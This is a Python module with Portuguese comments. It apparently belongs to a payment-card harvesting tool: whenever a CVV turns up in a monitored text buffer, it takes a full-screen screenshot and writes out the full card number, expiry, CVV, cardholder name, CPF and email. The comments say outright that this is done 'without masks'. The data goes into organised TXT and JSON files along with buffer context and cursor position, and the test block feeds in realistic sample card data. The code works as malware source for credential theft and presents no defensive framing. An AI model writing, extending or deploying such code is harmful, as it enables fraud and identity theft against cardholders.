"""
screenshot_capture.py - Captura screenshots quando CVV é detectado
VERSÃO: Pastas separadas para screenshots e arquivos TXT
CORREÇÃO: Reset correto do buffer entre capturas
"""

import pyautogui
import os
import json
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, Optional


class ScreenshotCapture:
    """Captura e salva screenshots com metadados - PASTAS SEPARADAS"""
    
    def __init__(self, base_dir: str = "dados_capturados"):
        self.base_dir = Path(base_dir)
        self.capture_count = 0
        
        # Cria diretórios separados
        self.screenshots_dir = self.base_dir / "screenshots"
        self.text_files_dir = self.base_dir / "textos"
        self.json_files_dir = self.base_dir / "metadados"
        
        # Cria todos os diretórios
        for directory in [self.screenshots_dir, self.text_files_dir, self.json_files_dir]:
            directory.mkdir(parents=True, exist_ok=True)
        
        print(f"   📁 Estrutura de pastas criada:")
        print(f"      📸 Screenshots: {self.screenshots_dir}")
        print(f"      📄 Textos: {self.text_files_dir}")
        print(f"      📝 Metadados: {self.json_files_dir}")
    
    def capture_on_cvv_detected(self, card_data: Dict, buffer_text: str = "") -> Dict:
        """
        Captura screenshot quando CVV é detectado
        Retorna dicionário com caminhos dos arquivos salvos
        
        CORREÇÃO: Adicionado buffer_text para capturar contexto atual
        """
        result = {
            'screenshot': None,
            'text_file': None,
            'metadata_file': None,
            'success': False
        }
        
        try:
            self.capture_count += 1
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Cria subdiretórios por data dentro de cada pasta
            today = datetime.now().strftime("%Y-%m-%d")
            
            screenshot_date_dir = self.screenshots_dir / today
            text_date_dir = self.text_files_dir / today
            json_date_dir = self.json_files_dir / today
            
            # Cria todos os subdiretórios de data
            for directory in [screenshot_date_dir, text_date_dir, json_date_dir]:
                directory.mkdir(exist_ok=True)
            
            # Nome base para todos os arquivos (sem extensão)
            base_filename = f"captura_{timestamp}_{self.capture_count}"
            
            print(f"\n   📊 Iniciando captura #{self.capture_count}...")
            
            # 1. CAPTURA SCREENSHOT
            screenshot_filename = f"{base_filename}.png"
            screenshot_path = screenshot_date_dir / screenshot_filename
            
            print(f"   📸 Capturando screenshot...")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            result['screenshot'] = str(screenshot_path)
            print(f"      ✅ Salvo em: {screenshot_path}")
            
            # 2. SALVA METADADOS EM JSON
            metadata_filename = f"{base_filename}.json"
            metadata_path = json_date_dir / metadata_filename
            
            metadata = {
                'capture_number': self.capture_count,
                'timestamp': datetime.now().isoformat(),
                'screenshot_path': str(screenshot_path),
                'screenshot_filename': screenshot_filename,
                'card_data': card_data,
                'buffer_text': buffer_text[:500],  # CORREÇÃO: Inclui contexto do buffer
                'screen_size': pyautogui.size(),
                'cursor_position': pyautogui.position(),
                'file_locations': {
                    'screenshot': str(screenshot_path),
                    'text_file': None,  # Será atualizado abaixo
                    'metadata': str(metadata_path)
                }
            }
            
            with open(metadata_path, 'w', encoding='utf-8') as f:
                json.dump(metadata, f, indent=2, ensure_ascii=False)
            
            result['metadata_file'] = str(metadata_path)
            print(f"      📝 Metadados salvo em: {metadata_path}")
            
            # 3. SALVA DADOS EM TXT (COMPLETOS)
            text_filename = f"{base_filename}.txt"
            text_path = text_date_dir / text_filename
            
            self._save_as_txt(text_path, card_data, buffer_text)
            result['text_file'] = str(text_path)
            
            # Atualiza metadata com caminho do TXT
            metadata['file_locations']['text_file'] = str(text_path)
            with open(metadata_path, 'w', encoding='utf-8') as f:
                json.dump(metadata, f, indent=2, ensure_ascii=False)
            
            result['success'] = True
            
            # Mostra resumo
            print(f"\n   📋 RESUMO DA CAPTURA #{self.capture_count}:")
            print(f"      📸 Screenshot: {screenshot_path.name}")
            print(f"      📄 Texto: {text_path.name}")
            print(f"      📝 Metadados: {metadata_path.name}")
            
            return result
            
        except ImportError:
            print("   ⚠️ pyautogui não instalado. Execute: pip install pyautogui")
            return result
        except Exception as e:
            print(f"   ❌ Erro ao capturar: {e}")
            import traceback
            traceback.print_exc()
            return result
    
    def _save_as_txt(self, filepath: Path, card_data: Dict, buffer_text: str = ""):
        """Salva dados COMPLETOS em formato TXT legível - SEM MÁSCARAS
        
        CORREÇÃO: Inclui contexto do buffer para análise
        """
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write(f"DADOS DE CARTÃO CAPTURADOS - DADOS COMPLETOS\n")
                f.write(f"Data/Hora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
                f.write(f"ID da Captura: #{self.capture_count}\n")
                f.write("=" * 60 + "\n\n")
                
                # Dados COMPLETOS - SEM MÁSCARAS
                if card_data.get('card_number'):
                    card_num = card_data['card_number']
                    clean_num = re.sub(r'\D', '', card_num)
                    if len(clean_num) >= 16:
                        formatted_num = f"{clean_num[:4]} {clean_num[4:8]} {clean_num[8:12]} {clean_num[12:16]}"
                        f.write(f"💳 NÚMERO DO CARTÃO: {formatted_num}\n")
                    else:
                        f.write(f"💳 NÚMERO DO CARTÃO: {card_num}\n")
                
                if card_data.get('card_brand'):
                    f.write(f"🏷️  BANDEIRA: {card_data['card_brand']}\n")
                
                if card_data.get('expiry_date'):
                    f.write(f"📅 VALIDADE: {card_data['expiry_date']}\n")
                
                if card_data.get('cvv'):
                    cvv = card_data['cvv']
                    f.write(f"🔐 CÓDIGO DE SEGURANÇA (CVV): {cvv}\n")
                
                if card_data.get('holder_name'):
                    name = card_data['holder_name']
                    if name:
                        name_parts = []
                        for part in name.split():
                            if part:
                                if part.lower() in ['da', 'de', 'do', 'das', 'dos']:
                                    name_parts.append(part.lower())
                                else:
                                    name_parts.append(part.capitalize())
                        full_name = ' '.join(name_parts)
                        f.write(f"👤 TITULAR DO CARTÃO: {full_name}\n")
                
                if card_data.get('cpf'):
                    cpf = card_data['cpf']
                    if cpf:
                        clean_cpf = re.sub(r'\D', '', cpf)
                        if len(clean_cpf) == 11:
                            f.write(f"📄 CPF: {clean_cpf[:3]}.{clean_cpf[3:6]}.{clean_cpf[6:9]}-{clean_cpf[9:]}\n")
                        else:
                            f.write(f"📄 CPF: {cpf}\n")
                
                if card_data.get('email'):
                    email = card_data['email']
                    if email:
                        f.write(f"📧 E-MAIL: {email}\n")
                
                if card_data.get('completeness'):
                    f.write(f"📊 COMPLETUDE DOS DADOS: {card_data['completeness']}%\n")
                
                # CORREÇÃO: Adiciona contexto do buffer para depuração
                if buffer_text:
                    f.write("\n" + "=" * 60 + "\n")
                    f.write("📝 CONTEXTO DO BUFFER (ÚLTIMOS 200 CARACTERES):\n")
                    f.write("=" * 60 + "\n")
                    truncated_buffer = buffer_text[-200:] if len(buffer_text) > 200 else buffer_text
                    f.write(truncated_buffer + "\n")
                    f.write("=" * 60 + "\n")
                
                f.write("\n" + "=" * 60 + "\n")
                f.write("📋 ESTADO DA CAPTURA:\n")
                f.write(f"  • Cartão: {'COMPLETO ✓' if card_data.get('card_number') else 'INCOMPLETO ✗'}\n")
                f.write(f"  • Validade: {'COMPLETO ✓' if card_data.get('expiry_date') else 'INCOMPLETO ✗'}\n")
                f.write(f"  • CVV: {'COMPLETO ✓' if card_data.get('cvv') else 'INCOMPLETO ✗'}\n")
                f.write(f"  • Nome: {'COMPLETO ✓' if card_data.get('holder_name') else 'INCOMPLETO ✗'}\n")
                f.write("=" * 60 + "\n\n")
                
                # INFORMAÇÕES DO SISTEMA
                f.write("📁 ARQUIVOS GERADOS:\n")
                f.write(f"  • Screenshot: captura_{self.capture_count}.png\n")
                f.write(f"  • Este arquivo: captura_{self.capture_count}.txt\n")
                f.write(f"  • Metadados: captura_{self.capture_count}.json\n")
                f.write("\n")
                f.write("⚡ SISTEMA DE MONITORAMENTO EM TEMPO REAL\n")
                f.write("⚠️  DADOS SENSÍVEIS - ARQUIVO DE LOG INTERNO\n")
                f.write("=" * 60 + "\n")
            
            print(f"      📄 Texto salvo em: {filepath}")
            
        except Exception as e:
            print(f"      ⚠️ Erro ao salvar TXT: {e}")
            # Fallback simples
            try:
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(f"Erro ao formatar. Dados brutos: {card_data}")
                print(f"      ✅ Dados salvos em formato simples")
            except:
                print(f"      ❌ Falha total ao salvar TXT")
    
    def get_folder_structure(self) -> Dict:
        """Retorna estrutura de pastas atual"""
        return {
            'base': str(self.base_dir),
            'screenshots': str(self.screenshots_dir),
            'text_files': str(self.text_files_dir),
            'metadata': str(self.json_files_dir)
        }
    
    def get_capture_stats(self) -> Dict:
        """Retorna estatísticas de captura por pasta"""
        stats = {
            'total_captures': self.capture_count,
            'by_folder': {},
            'latest_files': {}
        }
        
        try:
            # Conta arquivos por pasta
            folders = {
                'screenshots': self.screenshots_dir,
                'text_files': self.text_files_dir,
                'metadata': self.json_files_dir
            }
            
            for folder_name, folder_path in folders.items():
                if folder_name == 'screenshots':
                    count = len(list(folder_path.rglob("*.png")))
                elif folder_name == 'text_files':
                    count = len(list(folder_path.rglob("*.txt")))
                else:  # metadata
                    count = len(list(folder_path.rglob("*.json")))
                
                stats['by_folder'][folder_name] = count
                
                # Pega último arquivo
                files = list(folder_path.rglob("*.*"))
                if files:
                    latest_file = max(files, key=os.path.getctime)
                    stats['latest_files'][folder_name] = {
                        'file': latest_file.name,
                        'time': datetime.fromtimestamp(os.path.getctime(latest_file)).strftime('%d/%m/%Y %H:%M'),
                        'path': str(latest_file)
                    }
            
            return stats
            
        except Exception as e:
            print(f"   ⚠️ Erro ao calcular estatísticas: {e}")
            stats['error'] = str(e)
            return stats
    
    def clean_old_files(self, days_to_keep: int = 30) -> Dict:
        """Remove arquivos mais antigos que X dias"""
        result = {'deleted': 0, 'errors': 0, 'details': []}
        cutoff_time = datetime.now().timestamp() - (days_to_keep * 24 * 60 * 60)
        
        try:
            # Percorre todas as pastas
            all_folders = [self.screenshots_dir, self.text_files_dir, self.json_files_dir]
            
            for folder in all_folders:
                for file_path in folder.rglob("*.*"):
                    try:
                        if os.path.getctime(file_path) < cutoff_time:
                            file_path.unlink()
                            result['deleted'] += 1
                            result['details'].append(f"Removido: {file_path.name}")
                    except Exception as e:
                        result['errors'] += 1
                        result['details'].append(f"Erro ao remover {file_path.name}: {e}")
            
            return result
            
        except Exception as e:
            print(f"   ⚠️ Erro na limpeza: {e}")
            result['errors'] += 1
            result['details'].append(f"Erro geral: {e}")
            return result
    
    def test_folder_structure(self) -> bool:
        """Testa se a estrutura de pastas está funcionando"""
        print(f"\n   🧪 Testando estrutura de pastas...")
        
        try:
            # Verifica se pastas existem
            folders = [self.screenshots_dir, self.text_files_dir, self.json_files_dir]
            
            for folder in folders:
                if not folder.exists():
                    print(f"      ❌ Pasta não existe: {folder}")
                    return False
                print(f"      ✅ Pasta OK: {folder}")
            
            # Testa permissões de escrita
            test_files = []
            for folder in folders:
                test_file = folder / "test_permission.txt"
                try:
                    with open(test_file, 'w') as f:
                        f.write("test")
                    test_files.append(test_file)
                    print(f"      ✅ Permissão de escrita OK em: {folder}")
                except Exception as e:
                    print(f"      ❌ Sem permissão em {folder}: {e}")
                    return False
            
            # Limpa arquivos de teste
            for test_file in test_files:
                try:
                    test_file.unlink()
                except:
                    pass
            
            print(f"      ✅ Estrutura de pastas testada com sucesso!")
            return True
            
        except Exception as e:
            print(f"      ❌ Erro no teste: {e}")
            return False


# Teste do módulo com estrutura de pastas
if __name__ == "__main__":
    print("=" * 60)
    print("🧪 TESTE - ESTRUTURA DE PASTAS SEPARADAS")
    print("=" * 60)
    
    # Testa pyautogui
    try:
        import pyautogui
        print("   ✅ pyautogui instalado")
    except ImportError:
        print("   ⚠️ pyautogui não instalado. Instalando...")
        import subprocess
        subprocess.check_call(["pip", "install", "pyautogui"])
        import pyautogui
    
    # Cria instância
    capture = ScreenshotCapture()
    
    # Testa estrutura
    if not capture.test_folder_structure():
        print("   ❌ Falha na estrutura de pastas")
        exit(1)
    
    # Mostra estrutura
    structure = capture.get_folder_structure()
    print(f"\n   📁 Estrutura criada:")
    for key, path in structure.items():
        print(f"      {key}: {path}")
    
    # Testa captura
    test_data = {
        'card_number': '5440256585102453',
        'card_brand': 'Mastercard',
        'expiry_date': '05/27',
        'cvv': '010',
        'holder_name': 'juliano da silva pereira',
        'cpf': '123.456.789-00',
        'email': 'juliano.pereira@exemplo.com',
        'completeness': 100,
        'detection_time': datetime.now().isoformat()
    }
    
    print(f"\n   📸 Testando captura com pastas separadas...")
    result = capture.capture_on_cvv_detected(test_data, "Contexto de teste")
    
    if result['success']:
        print(f"\n   ✅ Captura #{capture.capture_count} realizada!")
        print(f"      📸 Screenshot: {result['screenshot']}")
        print(f"      📄 Texto: {result['text_file']}")
        print(f"      📝 Metadados: {result['metadata_file']}")
    else:
        print(f"\n   ❌ Falha na captura")
    
    # Mostra estatísticas
    stats = capture.get_capture_stats()
    print(f"\n   📊 Estatísticas:")
    print(f"      Capturas totais: {stats['total_captures']}")
    
    if 'by_folder' in stats:
        for folder, count in stats['by_folder'].items():
            print(f"      {folder}: {count} arquivos")
    
    print(f"\n{'='*60}")
    print("✅ TESTE FINALIZADO - PASTAS SEPARADAS")
    print(f"{'='*60}")